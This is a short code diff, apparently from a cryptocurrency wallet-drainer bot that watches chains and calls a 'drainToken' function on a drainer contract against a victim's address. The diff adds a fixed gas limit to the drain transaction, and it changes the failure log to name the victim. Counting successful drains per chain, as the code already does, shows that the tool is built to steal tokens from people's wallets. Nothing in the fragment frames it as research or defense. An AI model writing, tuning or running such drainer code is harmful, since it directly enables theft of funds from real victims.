@@ -130,7 +130,8 @@ async function monitorChain(config) {
                   address: drainer,
                   abi: DRAINER_ABI,
                   functionName: 'drainToken',
-                  args: [token, victim]
+                  args: [token, victim],
+                  gas: 200000n
                 });
                 
                 console.log(`✅ DRAINED! TX: ${hash}`);
@@ -141,7 +142,7 @@ async function monitorChain(config) {
                 stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
                 
               } catch (error) {
-                console.error(`❌ Drain failed: ${error.message}`);
+                console.error(`❌ Drain failed for ${victim}:`, error);
               }
             }
           } catch (error) {
